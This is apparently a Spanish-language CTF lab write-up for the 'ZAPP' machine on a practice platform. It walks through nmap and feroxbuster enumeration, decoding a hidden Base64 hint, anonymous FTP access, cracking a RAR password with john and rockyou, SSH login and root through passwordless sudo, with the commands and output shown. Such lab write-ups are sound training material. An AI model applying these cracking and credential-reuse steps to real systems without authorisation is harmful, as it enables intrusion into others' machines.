# 🗡️ ZAPP

## ZAPP — Informe Técnico del Laboratorio

**Entorno y contexto:**  
**The Hackers Labs**  
Máquina objetivo: **192.168.77.71**

Este documento recoge, con detalle técnico, todo el proceso realizado para el compromiso de la máquina: reconocimiento, enumeración, explotación y escalada a root.

---

## Resumen ejecutivo

- **Objetivo:** Obtener `user.txt` y `root.txt`.  
- **Resultado:** Acceso inicial mediante credenciales obtenidas desde FTP y recursos ocultos en la web; escalada final mediante permisos sudo sin contraseña.  
- **Servicios expuestos:** `ftp`, `ssh`, `http`.  
- **Herramientas utilizadas:** `nmap`, `feroxbuster`, `ftp`, `wget`, `rar2john`, `john`, `ssh`.  
- **Indicadores clave:** directorio oculto obtenido por Base64, archivo RAR protegido, credenciales reveladas.

---

# 1) Reconocimiento — Superficie de ataque

Ejecutamos un escaneo completo:

```bash
nmap -p- -T4 -sV -sC 192.168.77.71
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 15:40 CET
Nmap scan report for 192.168.77.71
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.77.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              28 Oct 29 20:59 login.txt
|_-rw-r--r--    1 0        0              65 Oct 29 21:23 secret.txt
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)
| ssh-hostkey:
|   3072 a3:23:b3:aa:df:c6:51:cb:a2:0c:92:8e:6b:fe:96:ee (RSA)
|   256 fd:95:2f:2f:7f:5a:21:b5:0e:75:2c:da:18:c9:52:35 (ECDSA)
|_  256 a1:0e:0d:79:8e:54:3e:0e:ed:2f:96:d6:d3:9a:9f:a6 (ED25519)
80/tcp open  http    Apache httpd 2.4.65 ((Debian))
|_http-server-header: Apache/2.4.65 (Debian)
|_http-title: zappskred - CTF Challenge
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.47 seconds
```

Servicios detectados:

- **FTP (21)** → acceso anónimo permitido  
- **SSH (22)**  
- **HTTP (80)** → página con contenido oculto y pistas internas  

---

# 2) Enumeración Web

Ejecutamos:

```bash
feroxbuster -u http://192.168.77.71/
```

```
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      402l     2257w   173244c http://192.168.77.71/zapp.jpg
200      GET      237l      488w     6570c http://192.168.77.71/
[####################] - 7s     30001/30001   0s      found:2       errors:412
[####################] - 6s     30000/30000   4944/s  http://192.168.77.71/
```

Detectamos:

- `/zapp.jpg`  
- Índice principal accesible  
- Bloques ocultos en el HTML  

### Mensaje escondido en `<div style="display:none">`

```
4444 VjFST1YyRkhVa2xUYmxwYVRURmFiMXBGYUV0a2JWSjBWbTF3WVZkRk1VeERaejA5Q2c9PQo=
```

Decodificado **4 veces** → revela:

```
cuatrocuatroveces
```

Directorio descubierto:

```
http://192.168.77.71/cuatrocuatroveces/
```

Dentro encontramos:

```
Sup3rP4ss.rar
```

![zapp_1](zapp_1.png)

---

# 3) FTP Anónimo

Ingreso:

```bash
ftp 192.168.77.71
# usuario: anonymous
```

Archivos dentro:

### login.txt
```
puerto
4444
coffee
GoodLuck
```

### secret.txt
```
0jO cOn 31 c4fe 813n p23p424dO, 4 v3c35 14 pista 357a 3n 14 7424
```

Confirmando que la pista estaba cifrada **4 veces**.

---

# 4) Rompiendo el archivo Sup3rP4ss.rar

Descarga:

```bash
wget http://192.168.77.71/cuatrocuatroveces/Sup3rP4ss.rar
```

Conversión a hash:

```bash
rar2john Sup3rP4ss.rar > rar.hash
```

Cracking:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
reema            (Sup3rP4ss.rar)
1g 0:00:00:34 DONE (2025-11-20 16:30) 0.02889g/s 2440p/s 2440c/s 2440C/s steps..precious5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Resultado:

```
reema
```

Descompresión:

```bash
unrar x Sup3rP4ss.rar
```

Contenido:

```
Sup3rP4ss.txt → "Intenta probar con más >> 3spuM4"
```

![zapp_2](zapp_2.png)

---

# 5) Acceso SSH

Credenciales generadas combinando:

- contenido del FTP  
- pista del RAR  
- directorio revelado  

```
Usuario: zappskred
Contraseña: 3spuM4
```

Acceso:

```bash
ssh zappskred@192.168.77.71
```

Obtención de `user.txt`:

```
ZWwgbWVq3IGy2FmZQo=
```

![zapp_3](zapp_3.png)

---

# 6) Escalada de privilegios

El usuario tiene sudo sin contraseña:

```bash
sudo -i
```

Con ello obtenemos root y leemos:

```
root.txt → c2llBXByZSBJcyBudWzdHJvCg==
```

---

# 7) Comandos clave utilizados

```bash
nmap -p- -T4 -sV -sC 192.168.77.71
feroxbuster -u http://192.168.77.71/
ftp 192.168.77.71
wget http://192.168.77.71/cuatrocuatroveces/Sup3rP4ss.rar
rar2john Sup3rP4ss.rar > rar.hash
john --wordlist=rockyou.txt rar.hash
ssh zappskred@192.168.77.71
sudo -i
```

---

# 8) Cierre

Laboratorio centrado en:

- enumeración web  
- búsqueda de pistas codificadas  
- explotación de FTP anónimo  
- ruptura de archivo protegido  
- escalada por sudo misconfigurado  

---

